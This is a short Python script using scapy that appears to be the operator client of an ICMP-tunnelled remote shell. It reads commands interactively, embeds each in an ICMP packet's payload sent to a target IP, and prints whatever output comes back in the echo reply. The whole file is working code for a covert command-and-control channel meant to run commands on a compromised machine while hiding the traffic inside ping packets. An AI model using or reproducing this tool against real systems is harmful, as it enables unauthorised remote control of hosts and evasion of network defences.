from scapy.all import *
import sys

def checkArgs(argv):
    if len(argv) != 3:
        print("[+] Error! Invalid arguments. Pass IP INTERFACE")
        print("[+] Example: sudo python client.py 192.168.0.211 eth0")
        quit()

def receive_packet(packet):
    if ICMP in packet and packet[ICMP].type == 0:
        output = packet[Raw].load
        print(output.decode('utf-8'))

checkArgs(sys.argv)

#destino do pacote icmp
target_ip = sys.argv[1]
interface = sys.argv[2] 

while True:
    cmd = input("Command > ")

    icmp_packet = IP(dst=target_ip)/ICMP()/cmd

    # Envia o pacote ICMP
    send(icmp_packet, iface=interface)
    sniff(filter="icmp", prn=receive_packet, count=1)
